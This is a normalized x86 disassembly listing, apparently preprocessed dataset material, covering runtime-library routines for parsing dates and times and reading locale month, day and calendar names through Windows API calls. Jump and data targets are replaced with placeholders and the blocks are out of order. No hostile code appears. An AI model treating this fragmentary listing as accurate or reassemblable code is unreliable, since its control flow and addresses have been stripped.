push ebp
call sub_409798
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409798
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408510
test eax eax
jne r-xdata
push ebp
call sub_409734
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a48
pop ecx
push ebp
call sub_409798
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_4096e8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_4096e8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4096e8
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409760
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_4096e8
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_4096e8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_4096e8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a48
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a48
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4096e8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408510
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409684
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a48
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409684
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409684
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4096c8
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409648
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4096c8
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408510
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409684
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409684
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4096c8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409648
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4096c8
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40bf10
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408510
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409684
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a48
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_4096e8
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408510
test eax eax
jne r-xdata
push ebp
call sub_409760
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409648
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4096c8
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4096c8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4096c8
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40bf10
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409a48
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409684
pop ecx
jmp r-xdata
push ebp
call sub_409760
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409648
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4096c8
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408510
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408510
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408510
test eax eax
jne r-xdata
jmp r-xdata
sub_40a1fc
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409a48
pop ecx
push ebp
mov eax ebx
call sub_409a48
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_403fa4
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a26c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404174
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a290
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a26c
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404174
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a324
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a39d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a3a4
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a26c
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404174
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_4043d4
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407b10
test eax eax
jne r-xdata
mov eax edi
call sub_404174
add [ esi ] eax
mov bl 0x1
sub_40a3b0
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a26c
mov eax esi
call sub_404174
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a3e8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404174
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a434
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404174
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40bf54
mov [ ebx ] eax
jmp r-xdata
sub_40a47c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404374
push eax
mov eax [ ebx ]
call sub_404374
pop edx
call sub_40c03c
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a4d0
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409670
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a52c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a847
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a3e8
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c004
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a290
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a434
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_4043d4
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407b80
mov eax [ ebp - 0x1c ]
call sub_40a47c
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a84e
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403ed8
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a3b0
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a290
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a3b0
test al al
je r-xdata
call sub_409670
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a290
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409414
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_4044b8
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a3b0
mov edx ebx
mov eax esi
call sub_40a26c
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404174
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a434
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a4d0
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a26c
mov eax esi
call sub_404174
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409670
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404174
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4043d4
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407b10
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404174
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_4043d4
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407b10
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40a870
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a324
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a324
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a324
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a290
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a26c
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a324
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a3b0
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a290
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a324
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a3b0
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a26c
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_40930c
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a324
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a290
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a324
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a3b0
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a324
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a290
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40aa64
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a870
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404174
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40aa98
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a52c
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40aa64
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404174
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40a870
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40ab24
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_403fa4
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40ab70
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403f08
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_403fa4
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40abbc
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40abe4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40ab70
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_4059b4
sub_40ac20
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40ad33
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40abe4
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f08
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40abe4
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403f08
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40abe4
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403f08
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40abe4
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403f08
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ad3a
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403ed8
retn
sub_40ad44
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_4040ac
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40ad80
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40ade5
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4040ac
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_407f60
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40adec
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
inc ebx
sub_40adf8
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40ae8f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40ab70
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_407f60
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ae96
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40ad44
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40ad80
call EnumCalendarInfoA
sub_40aea8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40b072
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403eb4
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40ab70
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_407f60
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_404174
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40b079
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403ed8
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
